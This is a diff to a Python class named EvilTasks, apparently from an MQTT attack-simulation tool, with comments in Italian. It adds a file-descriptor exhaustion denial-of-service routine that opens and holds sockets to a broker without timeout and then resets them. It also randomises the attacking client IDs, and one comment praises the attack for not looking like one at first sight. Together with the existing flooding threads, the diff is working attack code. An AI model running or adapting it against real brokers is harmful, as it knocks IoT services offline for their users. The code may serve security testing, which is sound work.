@@ -220,13 +220,13 @@ class EvilTasks:
 			publish_interval = max(MIN_PUBLISH_INTERVAL, publish_interval * (1 - free_ratio * 0.5))
 			flag = False
 
+		print(f"Publish interval: {publish_interval:.3f} s, RAM used: {USED_PERCENTAGE:.2%}")
 		return flag, publish_interval
 
 ##Preserva il requisito dell'utente e se la ram si satura, parte un algoritmo di controllo per la regolazione automatica del tempo interpacchetto:
 	def DoS_task(self, client_id, config, end_time, protocol, retain=False):
 
 		#import psutil
-		import time
 		import random
 		import string
 		import uuid
@@ -257,13 +257,11 @@ class EvilTasks:
 			#self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
 			time.sleep(publish_interval)
 
-			print(f"Publish interval: {publish_interval:.3f} s, RAM used: {USED_PERCENTAGE:.2%}")
 
 
 
 
 	def DoS2(self, client_id, config, end_time, protocol, retain=False):
-		import time
 		import random
 		import string
 		import gc
@@ -284,6 +282,7 @@ class EvilTasks:
 		client_pool = []
 		i = 1
 		while len(client_pool) < POOL_SIZE:
+			#Aggiungere randomizzazione se connessioni multiple startano da ogni thread
 			client_id_i = f"{client_id}_{i}"
 			client = self.MQTT_object.mqtt_register_client(client_id_i, protocol)
 			time.sleep(0.5)
@@ -347,10 +346,51 @@ class EvilTasks:
 
 
 
+	#In questo caso ho un numero di socket aperti per ogni dispositivo che è: Num_Sockets/sec * duration * N_threads
+	#Bisogna trovare un bilanciamento corretto in modo da evitare di overloaddare la RAM dei device.
+	#Vantaggio: il broker non sembra sotto attacco a prima vista -> Ram ~ 5%, CPU ~ 3-4%
+	def DoS_file_descriptors(self, client_id, config, end_time, protocol, retain):
+
+		import socket
+		import struct
+
+		sockets = []
+		duration = float(config["Duration"])
+		end_time = time.time() + duration
+
+		while time.time() < end_time:
+
+			s = socket.socket()
+			if s is not None:
+				
+				s.connect((self.MQTT_object.broker_address, self.MQTT_object.port))
+				#Tiene il socket aperto senza timout expiration
+				s.settimeout(None)
+				sockets.append(s)
+
+			time.sleep(0.1)
+
+		print("Fine FASE 1")
+		#Tengo occupato il client per fare la prova col subscriber
+		time.sleep(180)
+
+		for s in sockets:
+
+			if s:
+				linger = struct.pack('ii', 1, 0)
+				s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)
+				s.close()
+
+
+
+
 
 	#Spawn num_clients threads and each one of them makes a DoS_task
 	def DoS_attack(self, config, protocol, retain, role):
 		
+		import string
+		import random
+
 		num_clients = int(config["NumClients"])
 		duration = float(config["Duration"])
 		end_time = time.time() + duration
@@ -367,13 +407,19 @@ class EvilTasks:
 			func = self.DoS_task
 		elif role == "denial of service 2":
 			func = self.DoS2
+		elif role == "fd":
+			func = self.DoS_file_descriptors
+
 		print(f"Role : {role}")
 
 
 		print("Starting DoS")
 
 		for i in range(num_clients):
-			thread = threading.Thread(target=func, args=(f"dos_client_{i}", config, end_time, protocol, retain))
+
+			chars = string.ascii_letters + string.digits
+			id_number = "".join(random.choices(chars, k=13))
+			thread = threading.Thread(target=func, args=(f"dos_dev_{id_number}_{i}", config, end_time, protocol, retain))
 			thread.daemon = False
 			print("Inizio DoS")
 			#thread.daemon = False
